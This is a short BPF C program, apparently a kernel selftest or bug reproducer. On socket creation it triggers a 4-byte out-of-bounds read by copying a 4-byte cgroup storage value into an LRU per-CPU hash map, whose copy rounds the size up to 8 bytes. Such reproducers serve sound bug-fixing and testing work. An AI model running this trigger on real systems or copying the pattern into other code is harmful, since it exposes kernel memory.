// SPDX-License-Identifier: GPL-2.0
/* BPF program to trigger cgroup storage OOB read.
 *
 * This program creates:
 * 1. A CGROUP_STORAGE map with 4-byte value (not 8-byte aligned)
 * 2. A LRU_PERCPU_HASH map with 4-byte value (same size)
 *
 * When a socket is created in the cgroup, this program executes and triggers
 * bpf_map_update_elem() which calls copy_map_value_long(). This function
 * rounds up the copy size to 8 bytes, but the cgroup storage buffer is only
 * 4 bytes, causing an OOB read.
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

struct {
	__uint(type, BPF_MAP_TYPE_CGROUP_STORAGE);
	__type(key, struct bpf_cgroup_storage_key);
	__type(value, __u32);  /* 4-byte value - not 8-byte aligned */
} cgroup_storage SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_LRU_PERCPU_HASH);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, __u32);  /* 4-byte value - same as cgroup storage */
} lru_map SEC(".maps");

SEC("cgroup/sock_create")
int trigger_oob(struct bpf_sock *sk)
{
	__u32 key = 0;
	__u32 *cgroup_val;
	__u32 value = 0x12345678;

	/* Get cgroup storage value */
	cgroup_val = bpf_get_local_storage(&cgroup_storage, 0);
	if (!cgroup_val)
		return 0;

	/* Initialize cgroup storage */
	*cgroup_val = value;

	/* This triggers the OOB read:
	 * bpf_map_update_elem() -> htab_map_update_elem() ->
	 * pcpu_init_value() -> copy_map_value_long() ->
	 * bpf_obj_memcpy(..., long_memcpy=true) ->
	 * bpf_long_memcpy(dst, src, round_up(4, 8))
	 *
	 * The copy size is rounded up to 8 bytes, but cgroup_val
	 * points to a 4-byte buffer, causing a 4-byte OOB read.
	 */
	bpf_map_update_elem(&lru_map, &key, cgroup_val, BPF_ANY);

	return 0;
}

char _license[] SEC("license") = "GPL";
